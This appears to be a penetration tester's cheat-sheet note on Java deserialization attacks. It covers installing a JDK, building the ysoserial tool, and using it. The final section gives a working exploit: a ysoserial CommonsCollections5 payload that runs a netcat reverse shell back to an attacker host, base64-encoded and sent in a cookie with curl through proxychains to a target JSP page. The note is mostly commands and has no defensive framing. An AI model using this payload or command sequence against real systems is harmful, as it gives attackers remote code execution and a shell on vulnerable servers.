## Deserialization

Let the application deserialize your own injected objects that have a method that is called by the application or that calls a method in constructor/deconstructor.

### Build ysoserial
####Install JDK
```
Download http://www.oracle.com/technetwork/java/javase/downloads/index.html
unzip
mv jdk1.8.0_102/ /opt/
export JAVA_HOME="/opt/jdk1.8.0_102"
export JAVA_BIN="/opt/jdk1.8.0_102/bin"

update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_102/bin/java 1
update-alternatives --set java /opt/jdk1.8.0_102/bin/java
```

#### Builing jars from src /pom.xml
```
apt-get install maven
mvn install -DskipTests=true -Dmaven.javadoc.skip=true -B -V
```

#### Build ysoserial - Java deserialisation
```
git clone https://github.com/frohoff/ysoserial
mvn install -DskipTests=true -Dmaven.javadoc.skip=true -B -V
```

#### Use ysoserial 0.0.5
```
java -jar ysoserial-0.0.5-SNAPSHOT-all.jar CommonsCollections5 '/bin/nc -e /bin/sh 172.16.0.2 10101' | base64 | tr -d '\n'

proxychains curl -b 'userInfo = "'$(java -jar ../../web/ysoserial-0.0.5-SNAPSHOT-all.jar CommonsCollections5 '/bin/nc -e /bin/sh 172.16.0.2 10101' | base64 | tr -d '\n')'"'  http://192.168.1.2:8080/index.jsp
```

tags: #object_injection #deserialization #ysoserial 
